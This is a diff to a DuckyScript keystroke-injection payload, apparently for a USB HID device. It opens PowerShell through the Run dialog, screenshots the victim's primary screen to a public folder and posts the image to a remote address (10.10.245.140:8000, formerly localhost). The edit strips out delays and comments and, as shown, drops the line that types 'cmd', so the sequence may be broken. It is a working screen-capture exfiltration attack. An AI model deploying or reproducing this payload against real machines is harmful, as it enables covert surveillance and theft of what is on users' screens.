@@ -1,22 +1,12 @@
-DELAY 1000
 GUI r
-DELAY 400
-STRING cmd
-DELAY 400
 ENTER
-DELAY 700
+
 STRING powershell
-DELAY 700
+
 ENTER
-DELAY 1000
-REM Capture the screen and save as PNG
+
 STRING Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bmp.Save('C:\Users\Public\screenshot.png', [System.Drawing.Imaging.ImageFormat]::Png);
+
 ENTER
-DELAY 1000
-REM Upload the screenshot using Invoke-WebRequest
-STRING Invoke-WebRequest -Uri http://localhost:8000 -Method Post  -InFile 'C:\Users\Public\screenshot.png'
-ENTER
-DELAY 2000
-REM Close PowerShell
-STRING exit
-ENTER
+
+STRING Invoke-WebRequest -Uri http://10.10.245.140:8000 -Method Post  -InFile 'C:\Users\Public\screenshot.png'
